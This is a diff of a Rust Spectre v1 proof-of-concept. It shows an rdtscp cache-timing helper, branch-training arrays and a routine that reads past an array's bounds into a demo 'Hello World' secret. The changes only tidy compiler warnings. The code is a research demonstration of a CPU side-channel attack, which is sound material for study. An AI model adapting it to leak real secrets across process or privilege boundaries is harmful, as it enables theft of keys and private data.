@@ -11,9 +11,9 @@
 use std::arch::asm;
 use std::arch::x86_64::*;
 use rand::Rng;
-use std::process;
-use std::io;
-use std::io::Write;
+// use std::process;
+// use std::io;
+// use std::io::Write;
 
 const NUM_TRIES: u64 = 1000;
 const TRAINING_LOOPS: usize = 100;
@@ -24,13 +24,13 @@ const INBETWEEN_DELAY: u64 = 100;
 // timer, used for high-precision timing of cache hits and misses
 pub fn rdtscp() -> u64 {
     let eax: u32;
-    let ecx: u32;
+    let _ecx: u32;
     let edx: u32;
     unsafe {
     asm!(
       "rdtscp",
       lateout("eax") eax,
-      lateout("ecx") ecx,
+      lateout("ecx") _ecx,
       lateout("edx") edx,
       options(nomem, nostack)
     );
@@ -48,12 +48,12 @@ fn init_attack() -> (Vec<bool>, Vec<u8>) {
 
     // currently making the read order deterministic, doesn't seem to be
     // a problem
-    let mut attack_pattern: Vec<u8> = // (0..=255).collect();
+    let /* mut */ attack_pattern: Vec<u8> = // (0..=255).collect();
        vec! [133u8, 211, 224, 148, 141, 69, 183, 14, 76, 90, 37, 52, 94, 26, 46, 250, 41, 220, 237, 143, 156, 111, 166, 201, 36, 81, 104, 89, 96, 255, 182, 22, 64, 47, 87, 209, 225, 142, 151, 226, 219, 152, 126, 130, 106, 178, 186, 221, 17, 158, 125, 150, 20, 79, 243, 160, 167, 101, 249, 71, 51, 247, 124, 213, 222, 44, 5, 48, 193, 231, 212, 132, 55, 215, 176, 109, 240, 218, 206, 177, 164, 63, 82, 173, 61, 252, 4, 103, 154, 175, 59, 197, 199, 99, 146, 1, 241, 122, 74, 30, 159, 188, 242, 138, 93, 6, 129, 134, 181, 140, 123, 18, 229, 187, 162, 163, 80, 202, 29, 203, 38, 73, 185, 60, 13, 194, 190, 184, 62, 214, 161, 95, 196, 0, 21, 58, 53, 239, 227, 169, 149, 34, 45, 43, 165, 248, 200, 195, 8, 136, 98, 253, 144, 192, 121, 11, 9, 170, 15, 35, 57, 147, 23, 216, 65, 28, 157, 85, 107, 232, 174, 88, 16, 223, 67, 135, 25, 112, 86, 97, 7, 155, 208, 145, 70, 168, 246, 230, 72, 10, 210, 31, 27, 40, 2, 245, 233, 205, 12, 128, 75, 33, 102, 172, 153, 139, 198, 39, 131, 100, 191, 118, 179, 254, 84, 3, 207, 77, 19, 92, 32, 113, 228, 91, 78, 244, 171, 120, 114, 105, 235, 110, 251, 83, 180, 236, 49, 217, 204, 24, 115, 117, 54, 127, 238, 119, 108, 66, 189, 234, 68, 116, 137, 42, 56, 50];
 
     // STRANGELY, the attack doesn't work if the next three lines are deleted, likely due
     // to its affect on the storage allocators ?!?!?!
-    let mut rng = rand::thread_rng();
+    // let mut rng = rand::thread_rng();
     // println!("is_attack = {:?}", is_attack);
     // println!("attack_pattern = {:?}", attack_pattern);
 
@@ -75,7 +75,7 @@ pub fn fetch_function(arr1: &Vec<u8>, arr1_len: &mut usize, arr2: &[u8], idx: us
     // a constant, and you won't be able to delay the branch that checks if
     // the array access is overflowing!
 
-    let mut val: usize = 0;
+    let /* mut */ val: usize;
 
     // redundant check to make sure that the Spectre array access that
     // violates the array boundaries doesn't generate an exception in the
@@ -116,7 +116,7 @@ pub fn fetch_function(arr1: &Vec<u8>, arr1_len: &mut usize, arr2: &[u8], idx: us
 // arr1[target_idx], which surprise is actually an index past the end of arr1
 // into the secret array secret[]
 #[inline(never)]
-pub fn read_memory_byte(target_idx: usize, is_attack: &Vec<bool>, arr1: &Vec<u8>, arr1_len: &mut usize, arr2: &mut [u8], attack_pattern: &Vec<u8>, results: &mut [u32], idx: usize) -> u8 {
+pub fn read_memory_byte(target_idx: usize, is_attack: &Vec<bool>, arr1: &Vec<u8>, arr1_len: &mut usize, arr2: &mut [u8], attack_pattern: &Vec<u8>, results: &mut [u32]) -> u8 {
 
     let mut sum: u8 = 0;
 
@@ -206,15 +206,15 @@ fn main() {
 */
 
     // let mut arr1: [u8; 16] = [17, 8, 24, 14, 3, 28, 6, 19, 9, 25, 11, 30, 5, 20, 16, 2];
-    let mut arr1 = vec! [17u8, 8, 24, 14, 3, 28, 6, 19, 9, 25, 11, 30, 5, 20, 16, 2];
+    let /* mut */ arr1 = vec! [17u8, 8, 24, 14, 3, 28, 6, 19, 9, 25, 11, 30, 5, 20, 16, 2];
     // let mut rng = rand::thread_rng();
     // arr1.resize(arr1.len() + (rng.gen::<usize>() % 512), 0);
     // let mut secret: [u8; 20] = [72, 101, 108, 108, 111, 32, 87, 111, 114, 108, 100, 32, 72, 101, 108, 108, 111, 32, 32, 32];
-    let mut secret: [u8; 60] = [73, 101, 108, 108, 111, 32, 87, 111, 114, 108, 100, 32, 72, 101, 108, 108, 111, 32, 32, 32, 72, 101, 108, 108, 111, 32, 87, 111, 114, 108, 100, 32, 72, 101, 108, 108, 111, 32, 32, 32, 72, 101, 108, 108, 111, 32, 87, 111, 114, 108, 100, 32, 72, 101, 108, 108, 111, 32, 32, 32 ];
+    let /* mut */ secret: [u8; 60] = [73, 101, 108, 108, 111, 32, 87, 111, 114, 108, 100, 32, 72, 101, 108, 108, 111, 32, 32, 32, 72, 101, 108, 108, 111, 32, 87, 111, 114, 108, 100, 32, 72, 101, 108, 108, 111, 32, 32, 32, 72, 101, 108, 108, 111, 32, 87, 111, 114, 108, 100, 32, 72, 101, 108, 108, 111, 32, 32, 32 ];
     let secret_start:usize = 0;
 
-    let count1 = rdtscp();
-    let count2 = rdtscp();
+    // let count1 = rdtscp();
+    // let count2 = rdtscp();
     // println!("The timer values are {} and {} (diff = {})", count1, count2, count2-count1);
 
     // This is where you would set up shared memory for arr1 and arr2, as in the C++ code.
@@ -255,7 +255,7 @@ fn main() {
       for i in 0..secret.len()-secret_start {
           // println!("Reading at Target Address = {}", target_idx + i);
   
-          sum = read_memory_byte(target_idx + i, &is_attack, &arr1, &mut arr1_len, &mut arr2, &attack_pattern, &mut results, attack_pattern[0] as usize) - sum;
+          sum = read_memory_byte(target_idx + i, &is_attack, &arr1, &mut arr1_len, &mut arr2, &attack_pattern, &mut results) - sum;
           // println!("results = {:?}", results);
           // results[b'q' as usize] = 999;
   
